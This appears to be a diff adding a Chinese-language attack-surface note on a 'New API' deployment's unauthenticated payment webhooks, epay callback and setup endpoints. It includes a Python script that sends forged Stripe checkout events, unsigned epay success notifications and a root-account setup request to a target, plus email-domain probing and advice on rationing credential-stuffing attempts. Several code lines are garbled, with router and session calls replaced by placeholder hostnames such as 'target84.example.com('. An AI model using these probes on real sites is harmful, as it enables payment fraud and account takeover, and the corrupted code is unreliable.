@@ -1,0 +1,81 @@
+# New API 免鉴权面补充清单：支付回调 / webhook / setup 判定（源码对照版）
+
+> 与知识库条目 id=7「未授权面枚举清单」互补：id=7 覆盖读接口，本条覆盖**写接口（支付回调）与初始化接口**，以及各自的"能不能打"判定方法。
+
+## 一、路由来源（controller/topup.go、controller/setup.go、api-router.go）
+
+```go
+// 支付回调：注册时只有 anonymousRequestBodyLimit，**无任何鉴权中间件**
+target84.example.com("/stripe/webhook",  anonymousRequestBodyLimit, controller.StripeWebhook)
+target84.example.com("/creem/webhook",    anonymousRequestBodyLimit, controller.CreemWebhook)
+target84.example.com("/waffo/webhook",    anonymousRequestBodyLimit, controller.WaffoWebhook)
+target84.example.com("/waffo-pancake/webhook/:env", anonymousRequestBodyLimit, controller.WaffoPancakeWebhook)
+userRoute.GET("/epay/notify",  controller.EpayNotify)   // GET 也注册！
+target85.example.com("/epay/notify", anonymousRequestBodyLimit, controller.EpayNotify)
+apiRouter.GET/POST("/subscription/epay/notify", ...)
+
+// 初始化：无鉴权，但首行即 return
+apiRouter.GET/POST("/setup", controller.GetSetup/PostSetup)
+```
+
+实际路径前缀：`userRoute` = `/api/user` ⇒ epay 真实路径是 **`/api/user/epay/notify`**（`/api/epay/notify` 是 404，别打错）。
+
+## 二、判定脚本（Windows 用 Python，PowerShell 的 `-d '{...}'` 会吃掉 JSON 双引号，全部 POST 必须走 requests）
+
+```python
+import requests, json, hashlib
+T="https://TARGET"
+s=requests.Session(); s.trust_env=False
+s.headers.update({"User-Agent":"Mozilla/5.0 Chrome/126"})
+
+# 1) 三个 webhook：403/空 = 全站禁用（本例 stripe/creem/waffo 全 403，waffo-pancake 回 "webhook disabled"）
+ev=json.dumps({"id":"evt_X","object":"event","type":"checkout.session.completed",
+  "data":{"object":{"id":"cs_X","payment_status":"paid","amount_total":100,"metadata":{"user_id":"1"}}}})
+for p in ("/api/stripe/webhook","/api/creem/webhook","/api/waffo/webhook","/api/waffo-pancake/webhook/prod"):
+    print(p, target8.example.com(T+p, data=ev, headers={"Content-Type":"application/json"}, timeout=12).status_code)
+
+# 2) epay 回调：200 纯文本 `fail` = 端点活着但验签未过（无 key 不可伪造）
+base={"out_trade_no":"1","trade_no":"T1","trade_status":"TRADE_SUCCESS","total_fee":"0.01",
+      "pid":"1001","type":"alipay","name":"p","sign":"","sign_type":"MD5"}
+for p in ("/api/user/epay/notify","/api/subscription/epay/notify"):
+    print(p, s.get(T+p, params=base, timeout=10).text[:80])
+# 变体（空sign/错sign/零金额/错状态/缺pid/POST form）全部 `fail` => 排除
+
+# 3) setup：已初始化则任何载荷都拒绝
+print(target8.example.com(T+"/api/setup", json={"username":"root","password":"X@12345"}, timeout=12).text)
+# => {"message":"系统已经初始化完成","success":false}
+```
+
+## 三、判读表
+
+| 端点 | 期望安全响应 | 可利用判据 | 本例实测 |
+|---|---|---|---|
+| `POST /api/stripe/webhook` | 403 / 空 | 200 且事件被接受 = 可伪造充值 | **403 ⇒ disabled，排除** |
+| `POST /api/waffo-pancake/webhook/:env` | 403 | 200 | **403 `webhook disabled` ⇒ 排除** |
+| `GET/POST /api/user/epay/notify` | `fail`（纯文本） | 返回 `success` 或 200 JSON = 验签绕过 | **恒 `fail` ⇒ 无 key 不可伪造** |
+| `GET/POST /api/setup` | `系统已经初始化完成` | 返回成功/建号成功 = 可劫持 root | **`if constant.Setup return` 首行拦截 ⇒ 排除** |
+| `GET /api/user/groups` | 401 | 200 + 分组数据 = 未授权读 | **200，但属 header_nav fallback{RequireAuth:false} 设计公开，不计成果** |
+
+## 四、EpayNotify 三段拦截（controller/topup.go）
+
+```go
+if !isEpayWebhookEnabled()            { Write("fail"); return }  // ① 开关
+client := GetEpayClient()
+if client == nil                       { Write("fail"); return }  // ② 未配置
+verifyInfo, err := client.Verify(params)
+if err != nil || !verifyInfo.VerifyStatus { Write("fail"); return } // ③ 验签
+```
+**三步任一失败都回同一句 `fail`** ⇒ 无法用响应差异区分「webhook 未启用」与「验签失败」，没有 epay md5 key 就到此为止，别浪费请求次数。
+
+## 五、注册链前置条件（决定要不要走注册）
+
+```python
+# 邮箱策略：白名单 + 别名限制（service/email_binding.go ValidateAccountEmail）
+for e in ("a@gmail.com","b@qq.com","c@mailinator.com","d@yopmail.com","e@dropmail.me"):
+    print(e, s.get(T+"/api/verification", params={"email":e}, timeout=15).text[:120])
+```
+- gmail/qq → `{"message":"","success":true}`（**验证码 6 位数字**，`GenerateVerificationCode(6)`，10 分钟有效）
+- 临时邮箱域名 → `{"code":"EMAIL_ADDRESS_REJECTED", ...}` ⇒ **注册拿号这条路断，改打别的面**
+- 密码重置 token 是 `GenerateVerificationCode(0)` = **32 位 UUID（128bit）不可爆破**
+- 登录失败统一 `Username or password is incorrect, or user has been banned` ⇒ **无账号枚举**
+- `POST /api/user/register`/`login` 走 `CriticalRateLimit`，**默认 20 次/20 分钟且注册登录共享** —— 弱口令撞库在这个站只有 20 次额度，精打细算
